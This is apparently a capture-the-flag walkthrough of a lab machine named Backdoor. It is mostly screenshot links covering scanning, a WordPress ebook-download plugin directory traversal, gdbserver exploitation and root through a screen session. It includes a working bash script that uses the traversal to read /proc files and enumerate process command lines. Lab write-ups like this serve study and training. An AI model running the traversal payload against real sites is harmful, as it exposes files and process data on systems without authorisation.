![](backdoor%20loga.png)

# nmap
## nmap all ports
![](Backdoor/screenshots/nmap%20all%20ports.png)

## nmap services and versions
![](nmap%20versions%20and%20services.png)

# gobuster
## gobuster main
![](Backdoor/screenshots/gobuster%20main.png)

## gobuster main/wp-content
![](gobuster%20wp-content.png)

## wp-content/plugins
![](main-wp-contnent-plugins.png)

# searchsploit
![](searchsploit%20wordpress%20ebook.png)

## ebook poc directory traversal
![](wordpress%20ebook%20directory%20traversal.png)
## wordpress ebook directory traversal
![](wp-config.php.png)

## find out process id of port 1337
## test for process id 1 request
![](burp%20request%20process%20id.png)

## response succesfull
![](burp%20response%20process%20id.png)

## bash script for enumerating process IDs
````bash

#!/bin/bash


for pid in $(curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/sched_debug' --output - | awk '{print $3}' | grep -oP "\d{1,6}" | sort -u); do 
    
    content=$(timeout 1 bash -c "curl -s "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/$pid/cmdline"" --output - | awk -F 'cmdline' '{print $4}' | awk -F '<script>' '{print $1}' | tr -d "\0" &)

	if test $content; then
		echo "[*] PID $pid: " | tr -d "\n" 
		echo $content
	fi

done

`````

## snippet of PIDs
![](gdbserver%20PID%20990.png)


## searchsploit gdbserver
![](searchsploit%20gdbserver.png)

## shell as user
![](shell%20as%20user.png)

# linpeas
## screen session is running as root
![](linpeas%20screen%20session.png)

## screen -dmS root
## start screen session in detached mode as root

## attach root screen session
![](screen%20attach%20session%20%20as%20root.png)
![](screen%20root.png)

# shell as root
![](shell%20root.txt.png)
XXXXXXXxx